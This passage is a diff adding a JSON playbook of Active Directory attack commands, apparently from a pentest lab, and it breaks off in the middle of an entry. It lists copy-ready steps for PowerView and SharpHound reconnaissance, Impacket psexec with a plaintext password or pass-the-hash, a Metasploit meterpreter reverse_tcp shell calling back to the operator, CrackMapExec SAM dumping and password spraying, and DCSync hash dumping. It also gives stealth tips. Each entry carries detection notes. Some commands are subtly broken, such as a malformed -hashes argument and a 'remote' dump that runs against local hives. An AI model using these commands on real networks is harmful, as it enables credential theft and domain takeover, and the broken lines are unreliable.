@@ -1,0 +1,758 @@
+[
+  {
+    "id": "87cb075c-f935-4e66-be0f-ba74c3779dd3",
+    "label": "Enumerate Domain Users with PowerView",
+    "hasGraph": true,
+    "command": "# 1. Bypass execution policy and import the PowerView module\nSet-ExecutionPolicy Bypass -Scope Process -Force\nImport-Module .\\PowerView.ps1\n\n# 2. Enumerate all domain users and their failed password attempt counts\n# We include 'samaccountname' for better copy-pasting into attack tools\nGet-DomainUser -Properties name, samaccountname, badpwdcount | Sort-Object badpwdcount -Descending\n\n# 3. Pro-Tip: To find users specifically close to lockout (assuming a threshold of 5 or 10)\nGet-DomainUser -Properties samaccountname, badpwdcount | Where-Object { $_.badpwdcount -gt 0 }",
+    "description": "<p>Technical Deep Dive that explains the attack or technique:</p> <p>The <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> script is a cornerstone of the <span style=\"color:#ef4444;font-weight:bold;\">#PowerSploit</span> framework, designed for advanced <strong>Active Directory</strong> (AD) situational awareness. This specific command chain targets internal <strong>enumeration</strong>, allowing an attacker to map out user accounts and their associated security metadata. By querying the <code>badpwdcount</code> property, an attacker can identify which accounts are actively being targeted or are close to a <strong>lockout threshold</strong>. This reconnaissance is vital for planning subsequent <span style=\"color:#ef4444;font-weight:bold;\">#brute-force</span> or <strong>password spraying</strong> campaigns without triggering defensive alerts. It leverages legitimate LDAP queries, making it difficult to distinguish from normal administrative activity.</p> <ul> <li><strong>Tool Location/Source:</strong> The script is typically found in <code>/usr/share/powersploit/Recon/PowerView.ps1</code> on <strong>Kali Linux</strong>. It can also be downloaded from the official GitHub repository at <a href=\"https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/PowerView.ps1\">PowerView GitHub</a>. In a live engagement, it is often hosted on an attacker-controlled SMB or HTTP server and downloaded directly into memory.</li> <li><strong>Attack pre-requesite:</strong> A valid <strong>domain-joined</strong> system or a <strong>domain user context</strong> (standard user privileges are sufficient). <strong>PowerShell</strong> execution policy must allow script running (or be bypassed). Unrestricted network access to a <strong>Domain Controller</strong> via <span style=\"color:#3b82f6;\">TCP port 389</span> (LDAP) or <span style=\"color:#3b82f6;\">TCP port 636</span> (LDAPS).</li> <li><strong>What attacker gain:</strong> A complete list of <strong>valid usernames</strong> for future targeting. Knowledge of <strong>failed login attempts</strong> per user, helping to avoid account lockouts. Identification of <strong>high-value targets</strong> based on naming conventions or account activity.</li> <li><strong>Detection/Defense opsec:</strong> Monitor for large volumes of LDAP queries originating from non-admin workstations. Enable <strong>PowerShell Script Block Logging</strong> (Event ID 4104) to catch script-based enumeration. Loading scripts into memory (using <code>IEX</code>) is stealthier than writing <code>.ps1</code> files to the disk.</li> </ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#ec4899"
+  },
+  {
+    "id": "f2aaae82-f409-4085-8b52-911563b222f1",
+    "label": "Enumerate Domain Computers via LDAP (PowerView)",
+    "hasGraph": true,
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetComputer | select operatingsystem,operatingsystemversion",
+    "description": "<p>Using the <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> module, attackers can query the Active Directory Domain Controller to extract a complete list of all registered <strong>computer objects</strong>. This specific command filters the results to highlight the <code>operatingsystem</code> and <code>operatingsystemversion</code> properties. Identifying older, potentially unpatched systems (such as Windows 7 or Windows Server 2008) is a critical step in the <strong>Reconnaissance</strong> phase, allowing threat actors to pinpoint vulnerable targets for lateral movement or exploit execution (e.g., <span style=\"color:#ef4444;font-weight:bold;\">#EternalBlue</span>, <span style=\"color:#ef4444;font-weight:bold;\">#ZeroLogon</span>).</p> <ul> <li><strong>Tool Location/Source:</strong> PowerView is included within the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>. On <strong>Kali Linux</strong>, it is located at <code>/usr/share/powersploit/Recon/PowerView.ps1</code>.</li> <li><strong>Attack pre-requesite:</strong> Any valid <strong>domain user credentials</strong> or execution context on a domain-joined machine. Network connectivity to a Domain Controller over <span style=\"color:#3b82f6;\">LDAP (TCP port 389)</span>.</li> <li><strong>What attacker gains:</strong> A comprehensive map of the network's endpoints and servers. Identification of high-value targets (e.g., Domain Controllers, Exchange Servers). Discovery of deprecated or vulnerable operating systems suitable for exploitation.</li> <li><strong>Detection/Defense opsec:</strong> Monitor for large-scale LDAP queries requesting computer object attributes from non-administrative workstations. Deploy <strong>Microsoft Defender for Identity</strong> to detect reconnaissance patterns. Restrict LDAP query scope using <strong>Administrative SDHolders</strong> or fine-grained LDAP ACLs to limit enumeration of sensitive attributes.</li> </ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "608e8893-525f-4f36-b970-fcb96c5784a4",
+    "label": "Enumerate Domain Group Members (PowerView)",
+    "hasGraph": true,
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetGroupMember",
+    "description": "<p>Using the <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> module's <code>Get-NetGroupMember</code> cmdlet, attackers query the Domain Controller via LDAP to enumerate the users belonging to specific Active Directory groups. Identifying members of highly privileged groups (such as <strong>Domain Admins</strong> or <strong>Enterprise Admins</strong>) is a crucial step in the Reconnaissance phase. It allows threat actors to map the organizational permission structure and identify high-value target accounts for credential theft, <span style=\"color:#ef4444;font-weight:bold;\">#Kerberoasting</span>, or <span style=\"color:#ef4444;font-weight:bold;\">#AS-REP Roasting</span>.</p>\n<ul>\n  <li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>. On <strong>Kali Linux</strong>: <code>/usr/share/powersploit/Recon/PowerView.ps1</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> Execution context as a valid <strong>domain user</strong>. Network access to a Domain Controller over <span style=\"color:#3b82f6;\">LDAP (TCP port 389)</span>.</li>\n  <li><strong>What attacker gains:</strong> Knowledge of which user accounts hold administrative privileges in the domain. A narrowed target list for subsequent credential attacks or phishing campaigns. Insight into the AD security grouping and delegation structure.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor LDAP queries targeting sensitive groups like <code>Domain Admins</code>, <code>Enterprise Admins</code>, <code>Schema Admins</code> from non-admin workstations. Enable <strong>Windows Event ID 4661</strong> (object accessed) auditing on critical group objects. Deploy <strong>Microsoft Defender for Identity</strong> to detect group enumeration reconnaissance.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6"
+  },
+  {
+    "id": "ca5ddf74-e52b-4d2f-a712-2839ae4d2170",
+    "label": "Enumerate Group Policy Objects (PowerView)",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetGPO\nPS> Get-NetGPO | select displayname, whenchanged",
+    "description": "<p>Using the <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> cmdlet <code>Get-NetGPO</code>, an attacker queries Active Directory for <code>groupPolicyContainer</code> objects and related metadata such as display names, GUID-backed policy records, and modification timestamps. This reconnaissance reveals how domain-wide security settings are organized and helps identify recently changed or suspicious Group Policy Objects that may expose privileged scripts, software deployment paths, startup tasks, or weak configuration baselines. Because GPO metadata is generally readable by authenticated users, this technique is a low-noise way to map administrative control paths before privilege escalation or lateral movement.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker loads <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> into the current PowerShell session.</li>\n  <li><strong>How attack works:</strong> <code>Get-NetGPO</code> sends an LDAP query to the Domain Controller for <code>groupPolicyContainer</code> objects under the Policies container.</li>\n  <li><strong>How attack works:</strong> The Domain Controller returns GPO metadata that the attacker filters to identify interesting policies and recently modified entries.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>. On <strong>Kali Linux</strong>, common locations include <code>/usr/share/powersploit/Recon/PowerView.ps1</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> Execution context as an authenticated <strong>domain user</strong>. Network reachability to a Domain Controller over <span style=\"color:#3b82f6;\">LDAP (TCP port 389)</span> or <span style=\"color:#3b82f6;\">LDAPS (TCP port 636)</span>.</li>\n  <li><strong>What attacker gains:</strong> A map of domain Group Policy Objects, including names and change timing that can highlight privileged deployment paths, login scripts, hardening gaps, and follow-on targets for abuse.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor <strong>PowerShell Script Block Logging</strong> (Event ID 4104) for <code>Get-NetGPO</code> usage, alert on unusual LDAP enumeration of <code>groupPolicyContainer</code> objects from user workstations, restrict unnecessary administrative scripting on endpoints, and review high-risk GPO changes for unauthorized modification patterns.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "fe4ee290-5074-490a-893e-c28dc1e5206e",
+    "label": "PowerShell Fix Colors (PSReadLine)",
+    "command": "Remove-Module PSReadLine",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PSReadLine</span> is the PowerShell line-editing module that provides command history, syntax coloring, and interactive key handling. In unstable terminal environments such as reverse shells, WinRM consoles, custom Windows Terminal profiles, or mismatched ANSI/color settings, PSReadLine can render text invisibly, corrupt prompt redraws, or make input difficult to follow. Running <code>Remove-Module PSReadLine</code> unloads the module from the current session and falls back to basic console behavior, which often restores readable output and reliable command entry.</p>\n<ol>\n  <li><strong>How it works:</strong> The operator uses an existing PowerShell session where <span style=\"color:#ef4444;font-weight:bold;\">#PSReadLine</span> is active.</li>\n  <li><strong>How it works:</strong> <code>Remove-Module PSReadLine</code> unloads the line-editing module from the current process only.</li>\n  <li><strong>How it works:</strong> PowerShell reverts to simpler input handling, which usually resolves rendering issues without changing system-wide configuration.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#PSReadLine</span> is a standard PowerShell module commonly installed with Windows PowerShell and PowerShell 7. It can be inspected with <code>Get-Module -ListAvailable PSReadLine</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> An interactive <strong>PowerShell</strong> session where the module is currently loaded or auto-imported.</li>\n  <li><strong>What attacker gains:</strong> A more readable and stable shell, reducing operator friction during post-compromise PowerShell usage.</li>\n  <li><strong>Detection/Defense opsec:</strong> This command is not malicious by itself, but defenders can still monitor <strong>PowerShell Script Block Logging</strong> (Event ID 4104) or module lifecycle events to understand operator behavior inside suspicious sessions.</li>\n</ul>",
+    "tags": [
+      "shell:powershell",
+      "platform:windows",
+      "tool:psreadline",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#412525",
+    "hasGraph": true
+  },
+  {
+    "id": "8006fb10-b455-4c4f-b09f-14dc4fc1765c",
+    "label": "Enumerate Shares with PowerView",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetShare -ComputerName Spiderman",
+    "description": "<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> and its <code>Get-NetShare</code> cmdlet, an attacker can enumerate SMB shares exposed by a remote Windows host. The cmdlet ultimately relies on Windows share-enumeration mechanisms such as <code>NetShareEnum</code> over SMB/RPC to ask the target which administrative and user-created shares are available. This is a common discovery step because exposed shares often reveal sensitive documents, deployment packages, backup material, scripts, or writable locations that can support lateral movement, credential theft, or further privilege escalation.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker loads <span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> into the current PowerShell session.</li>\n  <li><strong>How attack works:</strong> <code>Get-NetShare -ComputerName &lt;host&gt;</code> triggers a remote share-enumeration request to the target system.</li>\n  <li><strong>How attack works:</strong> The target returns its available shares, which the attacker reviews to identify valuable or weakly protected paths.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>. Common Kali path: <code>/usr/share/powersploit/Recon/PowerView.ps1</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> Valid credentials or execution context that can reach the target host over <span style=\"color:#3b82f6;\">SMB (TCP port 445)</span> and related RPC services. Network connectivity to the remote Windows host is required.</li>\n  <li><strong>What attacker gains:</strong> A list of accessible network shares that can expose data repositories, administrative shares, or paths useful for staging tools and moving laterally.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor SMB share enumeration from unusual workstations, review host firewall rules around <span style=\"color:#3b82f6;\">TCP 445</span>, alert on suspicious remote share discovery activity, and minimize exposure of unnecessary or overly permissive shares.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "57afea04-0c96-4303-a890-8e2860b9d19e",
+    "label": "SharpHound Collection & BloodHound Analysis",
+    "command": "# Data Collection with SharpHound (zip file)\n\nPS>  Import-Module .\\Sharphound.ps1\nPS>  Get-Help Invoke-BloodHound\nPS>  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"\n\n# Move zip to Kali and Starting BloodHound\n\nsudo neo4j start\n\n# now connect to http://localhost:7474 , default credential neo4j/neo4j , then set the new password and remember it\n\nbloodhound\n\n\n",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#SharpHound</span> is the data-collection component of the BloodHound ecosystem, and <span style=\"color:#ef4444;font-weight:bold;\">#BloodHound</span> is the analysis interface that turns the collected Active Directory relationships into attack-path graphs. When the operator runs <code>Invoke-BloodHound -CollectionMethod All</code> from a compromised domain context, SharpHound queries LDAP, SMB, RPC, and related interfaces to gather information about users, groups, computers, sessions, trusts, local admin rights, and ACL-based privilege edges. The resulting JSON data is packaged into a zip archive, transferred to the attacker environment, ingested into a <strong>Neo4j</strong> database, and explored visually in BloodHound to reveal shortest paths to privileged targets such as <strong>Domain Admins</strong>.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker imports <span style=\"color:#ef4444;font-weight:bold;\">#SharpHound</span> and runs collection from a domain-joined shell.</li>\n  <li><strong>How attack works:</strong> SharpHound enumerates directory structure and host/session relationships across the domain.</li>\n  <li><strong>How attack works:</strong> The collected data is compressed into a zip archive and moved to the attacker machine.</li>\n  <li><strong>How attack works:</strong> The attacker starts <strong>Neo4j</strong>, opens <span style=\"color:#ef4444;font-weight:bold;\">#BloodHound</span>, and analyzes the graph for exploitable privilege paths.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> SharpHound and BloodHound are available from the <a href=\"https://github.com/SpecterOps/BloodHound\">BloodHound project</a>. PowerShell collectors are often staged locally as <code>SharpHound.ps1</code> on the compromised Windows host, while BloodHound commonly runs on the attacker machine with a local <strong>Neo4j</strong> service.</li>\n  <li><strong>Attack pre-requesite:</strong> Code execution as a domain user on at least one joined system. Network reachability to directory and endpoint services such as <span style=\"color:#3b82f6;\">LDAP (389/636)</span>, <span style=\"color:#3b82f6;\">SMB (445)</span>, and RPC-related interfaces as permitted by the environment.</li>\n  <li><strong>What attacker gains:</strong> A machine-readable graph of trust relationships, local admin rights, session exposure, delegation paths, and ACL abuse opportunities that dramatically accelerates privilege-escalation and lateral-movement planning.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor for abnormal LDAP volume, large-scale SMB/RPC enumeration, PowerShell execution of <code>Invoke-BloodHound</code>, and suspicious zip archives containing SharpHound collection output. Microsoft Defender for Identity, PowerShell logging, and endpoint telemetry can all help identify collection activity.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "phase:recon",
+      "tool:bloodhound",
+      "domain:ad",
+      "tool:sharphound"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "c2a161a8-078f-4fc1-a4ab-03d9b7456521",
+    "label": "Local User Environment Enumeration",
+    "command": "whoami\nwhoami /user\nwhoami /groups\necho USERNAME=%USERNAME%\necho USERDOMAIN=%USERDOMAIN%\necho LOGONSERVER=%LOGONSERVER%",
+    "description": "<p>Using native Windows command-line utilities such as <code>whoami</code> and environment-variable expansion, an attacker can quickly profile the security context of the current shell. This lightweight enumeration reveals the effective username, SID, group memberships, current domain context, and which logon server authenticated the session. It is usually one of the first post-compromise steps because it tells the operator whether they landed in a low-privilege local account, a domain user session, or a token with interesting group memberships that may support privilege escalation or lateral movement.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker runs <code>whoami</code>, <code>whoami /user</code>, and <code>whoami /groups</code> to query the active token.</li>\n  <li><strong>How attack works:</strong> Environment variables such as <code>%USERNAME%</code>, <code>%USERDOMAIN%</code>, and <code>%LOGONSERVER%</code> are read to confirm domain context and authentication source.</li>\n  <li><strong>How attack works:</strong> The combined output is used to decide whether the foothold is worth escalating, reusing, or pivoting from.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>whoami.exe</code> and environment-variable expansion are built into Windows and available from standard <strong>cmd.exe</strong> or PowerShell sessions.</li>\n  <li><strong>Attack pre-requesite:</strong> Interactive command execution on a Windows host. No elevated privileges are required for these read-only checks.</li>\n  <li><strong>What attacker gains:</strong> Username, user SID, token group membership, domain/workgroup context, and the logon server that authenticated the session.</li>\n  <li><strong>Detection/Defense opsec:</strong> These commands are common administrative actions, but defenders can still correlate them with suspicious child-process chains, fresh reverse shells, or broader post-exploitation command sequences.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "dc0c193c-e0fe-4129-8f09-954df7e30b52",
+    "label": "Domain Join and Machine Role Enum",
+    "command": "systeminfo | findstr /B /C:\"Host Name\" /C:\"Domain\" /C:\"Logon Server\"\nwmic computersystem get name,domain,partofdomain,domainrole\n",
+    "description": "<p>Using <code>systeminfo</code> and <code>wmic computersystem</code>, an attacker can determine whether a Windows host is domain-joined, which domain it belongs to, which logon server it used, and what logical role it plays in the environment. This is a valuable orientation step because the answer determines the rest of the attack path: a standalone workstation, a member server, and a Domain Controller expose very different opportunities and constraints. The <code>domainrole</code> field is especially useful because it distinguishes workstation, server, backup domain controller, and primary domain controller roles without requiring domain-admin access.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker queries basic host details with <code>systeminfo</code> and filters for hostname, domain, and logon-server values.</li>\n  <li><strong>How attack works:</strong> <code>wmic computersystem</code> returns whether the host is part of a domain and the numeric machine role.</li>\n  <li><strong>How attack works:</strong> The operator uses this to decide whether the foothold is on a workstation, member server, or domain infrastructure asset.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>systeminfo.exe</code>, <code>findstr.exe</code>, and <code>wmic.exe</code> are standard Windows command-line tools available on many Windows systems.</li>\n  <li><strong>Attack pre-requesite:</strong> Interactive command execution on the target Windows system. No administrative privileges are required for these checks.</li>\n  <li><strong>What attacker gains:</strong> Host name, domain membership, logon server, whether the system is domain-joined, and a machine role classification useful for prioritizing targets.</li>\n  <li><strong>Detection/Defense opsec:</strong> This enumeration is low noise and often blends with admin usage, so defenders should rely on process-chain context and suspicious shell telemetry rather than the commands alone.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "hasGraph": true
+  },
+  {
+    "id": "a1c8771a-3c54-43df-b0ce-57cc75e69a6c",
+    "label": "Local Users Enum",
+    "command": "net user\nwmic useraccount where \"LocalAccount=True\" get Name,SID,Disabled\n",
+    "description": "<p>Using <code>net user</code> and <code>wmic useraccount</code>, an attacker can list the local user accounts configured on a Windows system along with attributes such as SID and disabled state. This helps identify built-in administrators, dormant service accounts, renamed default accounts, and forgotten local users that may be worth targeting for password reuse, pass-the-hash, or privilege escalation. The enumeration is especially useful after landing on a non-domain-admin foothold because local accounts often become the next pivot point for host-to-host compromise.</p>\n<ol>\n  <li><strong>How attack works:</strong> <code>net user</code> lists locally known accounts from the host's account database.</li>\n  <li><strong>How attack works:</strong> <code>wmic useraccount where \"LocalAccount=True\"</code> returns structured account details such as name, SID, and disabled status.</li>\n  <li><strong>How attack works:</strong> The attacker uses the combined output to identify candidate accounts for reuse, abuse, or cleanup-resistant persistence checks.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>net.exe</code> and <code>wmic.exe</code> are built-in Windows administrative utilities.</li>\n  <li><strong>Attack pre-requesite:</strong> Interactive access to the Windows host. Standard local user privileges are generally sufficient for basic account enumeration.</li>\n  <li><strong>What attacker gains:</strong> Local usernames, SIDs, and enabled/disabled status that reveal administrative accounts, service identities, and possible hash or password targets.</li>\n  <li><strong>Detection/Defense opsec:</strong> The commands are common for legitimate troubleshooting, so defenders should focus on unusual shell activity, suspicious parent processes, and correlation with broader post-exploitation behavior.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "hasGraph": true
+  },
+  {
+    "id": "9de831a1-ad09-4477-9d60-84befe568dc8",
+    "label": "Local Admins Enum",
+    "command": "net localgroup administrators",
+    "description": "<p>Using <code>net localgroup administrators</code>, an attacker can list the principals that currently hold local administrator rights on the compromised host. This output often includes local accounts, domain users, and nested domain groups, making it one of the fastest ways to understand who can administer the box and which identities may already bridge into broader domain privilege. The result is useful for privilege escalation planning, lateral-movement targeting, and identifying whether a privileged domain group has local admin rights on a high-value endpoint.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker queries the local <strong>Administrators</strong> group using the built-in <code>net localgroup</code> command.</li>\n  <li><strong>How attack works:</strong> Windows resolves the group's membership and returns local and domain principals with local admin rights.</li>\n  <li><strong>How attack works:</strong> The operator evaluates whether any listed identities can be impersonated, targeted, or reused elsewhere in the environment.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <code>net.exe</code> is a standard Windows utility present on default installations.</li>\n  <li><strong>Attack pre-requesite:</strong> Interactive command execution on the host. Elevated privileges are generally not required to read local group membership.</li>\n  <li><strong>What attacker gains:</strong> The current membership of the local Administrators group, including domain groups and users that can administer the machine.</li>\n  <li><strong>Detection/Defense opsec:</strong> Like many built-in enumeration commands, this is low noise by itself. Defenders should correlate it with suspicious shells, user-context changes, or follow-on credential abuse.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "47776de2-cdd3-49dd-8660-6d387673164b",
+    "label": "Shell via Impacket PsExec",
+    "command": "# --- OPTION A: Impacket (Quickest Standalone Shell) ---\n\n# Option 1. Standard Login (Password)\n# Syntax: domain/username:password@IP\nimpacket-psexec 'MARVEL/fcastle:Password1@10.0.2.73'\n\n# Option 2. Pass-The-Hash (PTH)\n# If you only have the NTLM hash. Syntax: -hashes :<NTLM>\nimpacket-psexec -hashes :c39f2beb3d2ec06a62cb887fb391dee0 MARVEL/fcastle@10.0.2.73\n\n\n# --- OPTION B: Metasploit (Best for Pivoting/Meterpreter) ---\n\n# Start console\nmsfconsole -q\n\n# Load the module\nuse exploit/windows/smb/psexec\n\n# Configure Target & Credentials\nset RHOSTS 10.0.2.73\nset SMBUser fcastle\nset SMBDomain MARVEL.LOCAL\n# For Password:\nset SMBPass Password1\n# OR for Pass-The-Hash (Format is LM:NTLM, generally replace empty LM with 32 zeros):\n# set SMBPass 00000000000000000000000000000000:c39f2beb3d2ec06a62cb887fb391dee0\n\n# Configure Payload (Optional, defaults to meterpreter)\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST tun0\n\n# Execute\nrun",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>psexec</code> implementation provides a classic Windows lateral-movement path by authenticating over SMB, uploading a service payload to the remote host, and using the Service Control Manager to execute it as <strong>NT AUTHORITY\\\\SYSTEM</strong>. This runbook includes both password-based and pass-the-hash examples, plus a Metasploit alternative, but the core technique is the same: valid administrative credentials are converted into remote code execution over <span style=\"color:#3b82f6;\">TCP 445</span> and RPC service-management channels. Because the payload runs as a service, the attacker typically receives a high-privilege shell on the target machine without needing an exploit for memory corruption or user interaction.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker launches <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> <code>psexec</code> with either a password or NTLM hash.</li>\n  <li><strong>How attack works:</strong> The tool authenticates to the remote host over SMB, writes a service binary to <code>ADMIN$</code>, and registers it through the Service Control Manager.</li>\n  <li><strong>How attack works:</strong> The service starts as <strong>SYSTEM</strong> and returns an interactive shell to the operator.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> is available from the <a href=\"https://github.com/fortra/impacket\">Impacket project</a>. Common package names include <code>impacket-psexec</code> or <code>psexec.py</code>.</li>\n  <li><strong>Attack pre-requesite:</strong> Valid administrative credentials or a reusable NTLM hash for the target host, plus network reachability over <span style=\"color:#3b82f6;\">SMB (TCP 445)</span> and related SCM/RPC interfaces.</li>\n  <li><strong>What attacker gains:</strong> Remote code execution and typically a <strong>SYSTEM</strong>-level shell on the target Windows machine.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor service-creation events such as <strong>Event ID 7045</strong>, suspicious writes to <code>ADMIN$</code>, remote service-control activity, and anomalous SMB admin-share access from workstations or attack hosts.</li>\n</ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "4a696c60-541f-4649-9e77-12c922425fa1",
+    "label": "CME SAM Dump (CrackMapExec)",
+    "hasGraph": true,
+    "command": "crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam\n\ncrackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --\ncontinue-on-success\n\n",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#CrackMapExec</span> can automate remote credential dumping against Windows hosts by authenticating over SMB and invoking its <code>--sam</code> workflow to extract local account material from the target system. In practice, this targets the local Security Account Manager and related secrets available through remote administrative access, allowing an operator to dump NTLM hashes from one host or sweep multiple systems across a subnet. Because the technique turns valid administrative credentials into remote credential access, it is often used after initial foothold to identify reusable local admin passwords, feed pass-the-hash attacks, or confirm password reuse across the environment.</p>\n<ol>\n  <li><strong>How attack works:</strong> The attacker launches <span style=\"color:#ef4444;font-weight:bold;\">#CrackMapExec</span> against a host or subnet with valid credentials.</li>\n  <li><strong>How attack works:</strong> CME authenticates over SMB and triggers the remote <code>--sam</code> credential-dumping action on reachable hosts.</li>\n  <li><strong>How attack works:</strong> Returned local account hashes are reviewed for administrator reuse, cracking, or pass-the-hash follow-on activity.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#CrackMapExec</span> and its successor NetExec are available from their respective projects and common offensive-security package repositories.</li>\n  <li><strong>Attack pre-requesite:</strong> Valid credentials with sufficient rights on the target system, plus reachability over <span style=\"color:#3b82f6;\">SMB (TCP 445)</span>. Dumping SAM data generally requires administrative privileges on the remote host.</li>\n  <li><strong>What attacker gains:</strong> Local account NTLM hashes and related credential material that can be cracked offline or reused directly for lateral movement.</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor for suspicious SMB admin activity, remote registry or credential-dumping behavior, repeated host-to-host authentication attempts, and process telemetry associated with large-scale CME sweeps.</li>\n</ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "phase:exploit",
+      "domain:ad",
+      "tool:crackmapexec"
+    ],
+    "color": "#ef4444"
+  },
+  {
+    "id": "14fd4027-5df3-40a5-8c95-76e21adb7a01",
+    "label": "DCSync Remote Credential Dump (SecretsDump)",
+    "command": "# 1. Basic remote dump of SAM, LSA, and cached credentials using cleartext password\nimpacket-secretsdump -system SYSTEM_HIVE -sam SAM_HIVE -security SECURITY_HIVE LOCAL\nimpacket-secretsdump marvel/fcastle:Password1@10.0.2.72\n\n# 2. Remote dump using NTLM hash (Pass-the-Hash)\n# Format: -hashes [LM]:NTLM\nimpacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 marvel/fcastle@10.0.2.72\n\n# 3. Perform a DCSync attack against a Domain Controller to dump all domain hashes\n# Requires Domain Admin-level privileges\nimpacket-secretsdump -just-dc-ntlm marvel/fcastle:Password1@10.0.2.72\n\n# 4. Dump LSA secrets specifically\nimpacket-secretsdump -history -users-retrieved users.txt marvel/fcastle:Password1@10.0.2.72",
